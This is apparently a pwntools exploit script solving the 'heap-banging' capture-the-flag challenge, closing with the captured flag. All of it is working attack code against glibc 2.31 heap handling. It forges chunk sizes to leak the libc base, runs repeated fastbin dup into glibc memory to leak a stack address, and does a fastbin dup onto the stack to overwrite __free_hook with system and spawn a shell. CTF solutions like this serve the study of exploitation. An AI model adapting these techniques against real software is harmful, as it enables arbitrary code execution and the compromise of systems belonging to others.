from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./heap-banging_patched', '''
    brva 0x13ac
    brva 0x1422
    brva 0x14bc
    brva 0x1556
    continue
''')

# p = remote('heap-banging.chal.crewc.tf', 1337, ssl=True)

# calloc a chunk of size 0x80 for 0x41 times at most
def forge_anthem():
    p.sendlineafter(b">> ", b'1')

# write 0x78 bytes of data from a chunk at an index
def headbang_riff(index):
    p.sendlineafter(b">> ", b'2')
    p.sendlineafter(b"Choose riff: ", str(index).encode())
    p.recvuntil(b"Song lyrics: ")
    return p.recv(0x78)

# read 0x7a bytes of data at most to a chunk at an index
def distort_growl(index, data):
    p.sendlineafter(b">> ", b'3')
    p.sendlineafter(b"Choose song to play:", str(index).encode())
    p.sendafter(b"Sing along: ", data)

# free a chunk at an index and set its pointer to NULL
def slay_song(index):
    p.sendlineafter(b">> ", b'4')
    p.sendlineafter(b"Choose song to forget: ", str(index).encode())

# key points of calloc in glibc 2.31:
# 1. it cannot allocate a freed chunk from tcache bins
# 2. it cannot erase an allocated chunk whose mmap flag in size field is set to 1

glibc_e = ELF('./libc.so.6')

# Stage 1: leak glibc base address
for _ in range(11):
    forge_anthem() # 0-10
# free 7 chunks to fill tcache bin of size 0x80 for further fastbin dup
for i in range(3, 10):
    slay_song(i) # 3-9
# overwrite size field of chunk at index 1 with 0x481
distort_growl(0, b'\x00'*0x78+p16(0x481))
# free chunk of fake size 0x480 at index 1 into unsorted bin, containing chunks from index 1 to 9
slay_song(1) # 1
# re-allocate chunk at index 1/11 to place glibc duplicates to be first two qwords of chunk at index 2
forge_anthem() # 11/1
# leak glibc address from chunk at index 2
glibc_base_addr = u64(headbang_riff(2)[0:8])-0x1ecbe0
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# Stage 2: fastbin dup into glibc repeatedly to leak a stack address of current rsp value
# re-allocate chunk at index 2/12 to make use-after-free available
forge_anthem() # 12/2
# free chunk at index 2 into fastbin of size 0x80
slay_song(2) # 2/12
# fastbin dup into glibc for multiple times from global_max_fast+8 (*global_max_fast=0x80 coincidentally) until there exists any stack address in a glibc chunk of size 0x80
for i in range(15):
    distort_growl(12, p64((((glibc_base_addr+glibc_e.symbols['_obstack']-0x78)+8)-0x10)+i*0x80))
    forge_anthem() # (13+i*2)/12
    # perform fastbin dup into glibc at ((glibc_base_addr+glibc_e.symbols['_obstack']-0x78)+8)+i*0x80 (arbitrary read of 0x78 bytes and arbitrary write of 0x7a bytes)
    forge_anthem() # 14+i*2
    # free chunk at index 13+i*2 into fastbin of size 0x80 for next fastbin dup into glibc
    slay_song(13+i*2) # (13+i*2)/12
    if i < 14:
        # overwrite size field of chunk at index 14+i*2+1 with 0x82 to set mmap flag to 1 to avoid automatic erasing when next calloc on it is performed
        distort_growl(14+i*2, b'\x00'*0x78+p16(0x82))
# leak a stack address of current rsp value from chunk at index 14+i*2=42
current_rsp_val = u64(headbang_riff(14+i*2)[0x58:0x60])-0x338 # -0x338 locally and -0x330 remotely
log.info(f'current rsp value: {hex(current_rsp_val)}')

# Stage 3: fastbin dup into stack to pop a shell through hook overwrite
i += 1 # 14+1=15
distort_growl(12, p64(((current_rsp_val+0xc)+8)-0x10))
forge_anthem() # (13+i*2)/12
# put 0x82 as index number onto stack as fake size to satisfy condition of fastbin dup into stack
slay_song(0x82)
# perform fastbin dup into stack at (current_rsp_val+0xc)+8 (arbitrary read of 0x78 bytes and arbitrary write of 0x7a bytes)
forge_anthem() # 14+i*2
# overwrite pointer of chunk at index 1 with __free_hook address and pointer of chunk at index 2 with binsh string address through chunk at index 14+i*2
distort_growl(14+i*2, b'\x00'*4+p64(glibc_base_addr+glibc_e.symbols['__free_hook'])+p64(glibc_base_addr+next(glibc_e.search(b'/bin/sh\x00'))))
# write system address to __free_hook through chunk at index 1
distort_growl(1, p64(glibc_base_addr+glibc_e.sym.system))
# free chunk at index 2 to trigger system('/bin/sh\x00')
slay_song(2) # 2/12

p.interactive()

# crew{st1ll_b4ng1n6_y0u2_h3ad_wh1l3_perf0rm1n6_Fas7_B1n_4t7ack5?}